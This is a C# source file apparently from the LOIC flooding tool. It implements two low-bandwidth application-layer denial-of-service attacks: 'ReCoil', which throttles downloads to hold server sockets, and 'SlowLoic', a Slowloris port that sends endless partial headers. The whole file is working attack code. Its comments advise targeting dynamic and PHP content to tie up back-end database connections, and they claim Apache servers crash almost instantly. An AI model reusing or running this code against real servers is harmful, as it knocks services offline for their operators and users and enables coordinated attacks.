/* collection of some upper layer protocol stress-testing
 * loosely based on the slow-loris attempts and other low bandwidth attempts
 * 
 * and always remember:
 * if you hit your own server, it is called: stress-testing
 * if you hit a server that is not yours, it is called: DOS-Attack
 * if you want to test your server but are too stoned to enter your ip correctly, 
 * it is called: accident (and always blame it on the weed!)
 * 
 * B²
 */

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Net.Sockets;

namespace LOIC
{
    public abstract class cHLDos
    {
        public enum ReqState { Ready, Connecting, Requesting, Downloading, Completed, Failed };
        public ReqState State = ReqState.Ready;
        
        public bool IsDelayed { get; set; } // don't spawn new threads until the last one reached the full capacity!!

        public int Requested { get; set; }
        public int Downloaded { get; set; }
        public int Failed { get; set; }

        public bool IsFlooding { get; set; }
        public int Delay { get; set; }
        public int Timeout { get; set; }

        public virtual void start()
        { }

        public virtual void stop()
        {
            IsFlooding = false;
        }

        // override this if you want to test the settings before spreading the word to the hivemind!
        // should make a single connection and check for the expected outcome!
        public virtual bool test()
        {
            return true;
        }
    }

    /// <summary>
    /// ReCoil basically does a "reverse" DDOS
    /// Requirements: the targeted "file" has to be larger than 24 KB (bigger IS better ;) !)
    /// </summary>
    /// <remarks>
    /// it sends a complete legimit request but throttles the download down to nearly nothing .. just enough to keep the connection alive
    /// the attack-method is basically the same as slowloris ... bind the socket as long as possible and eat up as much as you can
    /// apache servers crash nearly in an instant. this attack however can NOT be mitigated with http-ready and mods like that.
    /// this attack simulates sth like a massive amount of mobile devices running shortly out of coverage (like driving through a tunnel)
    /// 
    /// due to the nature of the congestian-response this could maybe taken a step further to self-feeding congestion-cascades 
    /// if done "properly" in a distributed manner together with packet-floods.(??)
    /// 
    /// Limitations / Disadvantages:
    /// this does NOT work if you are behind anything like a proxy / caching-stuff.
    /// in this implementation however we are bound to the underlying system-/net-buffers ...
    /// due to that the required size of the targeted file differs -.-
    /// Dataflow: {NET} --> {WINSOCK-Buffer} --> ClientSocket .. so we have to make sure the actual data exceeds
    /// the winsock-buffer + clientsocket-buffer, but we can ONLY change the latter.
    /// from what i could find on a brief search / test the winsock buffer for a 10/100 links lies around 16-18KB
    /// where 1 GBit links have an underlying buffer around 64KB (size really does matter :P )
    /// 
    /// what to target?:
    /// although it might makes sense to target pictures or other large files on the server this doesn't really makes sense!
    /// the server could (and in most cases does - except for apache) always read directly from the file-stream resulting in nearly 0 needed RAM
    /// --> always target dynamic content! this has to be generated on the fly / pulled fom a DB 
    /// and therefor most likely ends up in the RAM!
    /// 
    /// high-value targets / worst case szenario:
    /// as it seems the echo statement in php writes directly to the socket .. considering this it should be possible to
    /// take down the back-end infrastructure if the page does an early flush causing the congestation while still holding DB-conns etc.
    /// </remarks>
    public class ReCoil : cHLDos
    {
        private string _dns;
        private string _ip;
        private int _port;
        private string _subSite;
        private bool _random;

        private int _nSockets;
        private List<Socket> _lSockets  = new List<Socket>();

        public ReCoil(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, int nSockets)
		{
            this._dns = (dns == "") ? ip : dns; //hopefully they know what they are doing :)
			this._ip = ip;
			this._port = port;
			this._subSite = subSite;
            this._nSockets = nSockets;
			if (timeout <= 0)
			{
				this.Timeout = 30000; // 30 seconds
			}
			else
			{
				this.Timeout = timeout * 1000;
			}
			this.Delay = delay+1;
            this._random = random;
            IsDelayed = true;
            Requested = 0; // we reset this! - meaning of this counter changes in this context!
 		}



        public override void start()
        {
            IsFlooding = true;
            var bw = new BackgroundWorker();
            bw.DoWork += new DoWorkEventHandler(bw_DoWork);
            bw.RunWorkerAsync();
        }

        private void bw_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                int bsize = 16;
                byte[] sbuf;
                byte[] rbuf = new byte[bsize];
                // header set-up
                if (_random == true)
                {
                    sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Connection: keep-alive{2}{2}{2}", _subSite, new Functions().RandomString(), Environment.NewLine, _dns));
                }
                else
                {
                    sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Connection: keep-alive{1}{1}{1}", _subSite, Environment.NewLine, _dns));
                }
                // establishing the connection
                //var host = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
                State = ReqState.Ready;
                var stop = DateTime.Now;

                while (IsFlooding)
                {
                    stop = DateTime.Now.AddSeconds(Timeout);
                    State = ReqState.Connecting; // SET STATE TO CONNECTING //

                    // we have to do this really slow 
                    while (IsDelayed && (DateTime.Now < stop))
                    {
                        var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        socket.ReceiveBufferSize = bsize;
                        socket.Blocking = true;
                        try
                        {
                            socket.Connect(((_ip == "") ? _dns : _ip), _port);
                            socket.Send(sbuf);
                        }
                        catch
                        { }

                        if (socket.Connected)
                        {
                            _lSockets.Add(socket);
                            Requested++;
                            if (_lSockets.Count < _nSockets)
                            {
                                System.Threading.Thread.Sleep(Delay);
                            }
                        }
                        if (_lSockets.Count >= _nSockets)
                        {
                            IsDelayed = false;
                            System.Threading.Thread.Sleep(Delay * 10);
                        }
                    }

                    State = ReqState.Downloading;
                    for (int i = (_lSockets.Count - 1); i >= 0; i--)
                    { // keep the sockets alive
                        try
                        {
                            // here's the downfall: if the server at one point decides to just discard the socket 
                            // and not close / reset the connection we are stuck with a half-closed connection
                            // testing for it doesn't work, because the server than resets the connection in order
                            // to respond to the new request ... so we have to rely on the connection timeout!
                            if (!_lSockets[i].Connected || (_lSockets[i].Receive(rbuf) < bsize))
                            { 
                                _lSockets.RemoveAt(i);
                                Failed++;
                                Requested--; // the "requested" number in the stats shows the actual open sockets
                            }
                            else
                            {
                                Downloaded++; // this number is actually BS .. but we wanna see sth happen :D
                            }
                        }
                        catch
                        {
                            _lSockets.RemoveAt(i);
                            Failed++;
                            Requested--;
                        }
                    }

                    IsDelayed = (_lSockets.Count < _nSockets);
                    if (!IsDelayed)
                    {
                        State = ReqState.Completed;
                        System.Threading.Thread.Sleep(Timeout);
                    }
                }
            }
            catch
            { 
                State = ReqState.Failed;
            }
            finally 
            { 
                IsFlooding = false;
                // not so sure about the graceful shutdown ... but why not?
                for (int i = (_lSockets.Count - 1); i >= 0; i--)
                {
                    try
                    {
                        _lSockets[i].Close();
                    }
                    catch { }
                }
                _lSockets.Clear();
            }
        }

        public override bool test()
        { // do the scouting on your own!
            return true;
        }
    } // class ReCoil

    /// <summary>
    /// SlowLoic is the port of RSnake's SlowLoris
    /// </summary>
    public class SlowLoic : cHLDos
    {
        private string _dns;
        private string _ip;
        private int _port;
        private string _subSite;
        private bool _random;
        private bool _randcmds;
        private bool _useget;
        private bool _usegZip;

        private int _nSockets;
        private List<Socket> _lSockets  = new List<Socket>();

        public SlowLoic(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, int nSockets, bool randcmds, bool useGet, bool usegZip)
		{
            this._dns = (dns == "") ? ip : dns; //hopefully they know what they are doing :)
			this._ip = ip;
			this._port = port;
			this._subSite = subSite;
            this._nSockets = nSockets;
			if (timeout <= 0)
			{
				this.Timeout = 30000; // 30 seconds
			}
			else
			{
				this.Timeout = timeout * 1000;
			}
			this.Delay = delay+1;
            this._random = random;
            this._randcmds = randcmds;
            this._useget = useGet;
            this._usegZip = usegZip;
            IsDelayed = true;
            Requested = 0; // we reset this! - meaning of this counter chnges in this context!
 		}


        public override void start()
        {
            IsFlooding = true;
            var bw = new BackgroundWorker();
            bw.DoWork += new DoWorkEventHandler(bw_DoWork);
            bw.RunWorkerAsync();
        }

        private void bw_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                // header set-up
                byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
                byte[] tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}", Environment.NewLine));
                State = ReqState.Ready;
                var stop = DateTime.Now;

                while (IsFlooding)
                {
                    stop = DateTime.Now.AddSeconds(Timeout);
                    State = ReqState.Connecting; // SET STATE TO CONNECTING //

                    // we have to do this really slow 
                    while (IsDelayed && (DateTime.Now < stop))
                    {
                        if (_random == true)
                        {
                            sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{4} {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Connection: keep-alive{2}Content-Length: 42{2}{5}", _subSite, new Functions().RandomString(), Environment.NewLine, _dns, ((_useget) ? "GET" : "POST"), ((_usegZip) ? ("Accept-Encoding: gzip,deflate" + Environment.NewLine) : "")));
                        }
                        var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        try
                        {
                            socket.Connect(((_ip == "") ? _dns : _ip), _port);
                            socket.NoDelay = true;
                            socket.Send(sbuf);
                            socket.Blocking = false;
                        }
                        catch
                        { }

                        if (socket.Connected)
                        {
                            _lSockets.Add(socket);
                            Requested++;
                            if (_lSockets.Count < _nSockets)
                            {
                                System.Threading.Thread.Sleep(Delay);
                            }
                        }
                        IsDelayed = (_lSockets.Count < _nSockets);
                    }
                    State = ReqState.Requesting;
                    if (_randcmds)
                    {
                        tbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("X-a: b{0}{1}", new Functions().RandomString(), Environment.NewLine));
                    }
                    for (int i = (_lSockets.Count - 1); i >= 0; i--)
                    { // keep the sockets alive
                        try
                        {
                            if (!_lSockets[i].Connected || (_lSockets[i].Send(tbuf) <= 0))
                            { 
                                _lSockets.RemoveAt(i);
                                Failed++;
                            }
                            else
                            {
                                Requested++; 
                            }
                        }
                        catch
                        {
                            _lSockets.RemoveAt(i);
                            Failed++;
                        }
                    }

                    IsDelayed = (_lSockets.Count < _nSockets);
                    if (!IsDelayed)
                    {
                        State = ReqState.Completed;
                        System.Threading.Thread.Sleep(Timeout);
                    }
                }
            }
            catch
            { 
                State = ReqState.Failed;
            }
            finally 
            { 
                IsFlooding = false;
                // not so sure about the graceful shutdown ... but why not?
                for (int i = (_lSockets.Count - 1); i >= 0; i--)
                {
                    try
                    {
                        _lSockets[i].Close();
                    }
                    catch { }
                }
                _lSockets.Clear();
            }
        }


        public override bool test()
        { // do the scouting on your own!
            return true;
        }

    } // class SlowLoic



}
